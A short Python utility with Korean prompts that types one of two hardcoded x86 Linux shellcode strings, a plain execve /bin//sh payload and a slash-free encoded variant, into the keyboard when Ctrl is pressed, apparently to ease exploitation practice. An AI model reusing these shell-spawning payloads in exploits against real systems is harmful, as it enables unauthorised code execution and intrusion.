import keyboard
import sys
from click.termui import pause
#-*- coding: utf-8 -*-

print("안녕하세요. 이 프로그램은 bash 쉘코드를 좀더 쉽게 적기 위해 제작된 프로그램입니다.")

while True :
    print('옵션을  선택하십시오')
    print("1. 일반 쉘코드")
    print("2. '/' 없는쉘코드")
    print('0. 종료')

    a = input();

    if int(a) == 1 :
        print("1번을 선택하셨습니다. 컨트롤(ctrl)키를 누르시면 일반 쉘 코드를 붙여넣습니다.")
        keyboard.wait('ctrl')
        
        keyboard.write('\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80')
    elif int(a) == 2:
            print("2번을 선택하셨습니다. 컨트롤(ctrl)키를 누르시면 '/' 없는 쉘 코드를 붙여넣습니다.")
            keyboard.wait('ctrl')
            keyboard.write('\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x32\\x80\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\\x32\\xc1\\x51\\x69\\x30\\x30\\x74\\x69\\x69\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\x51\\x54\\x8a\\xe2\\x9a\\xb1\\x0c\\xce\\x81')
    else:
        print('프로그램을 종료합니다. 사용해주셔서 감사합니다.')
        pause
        sys.exit()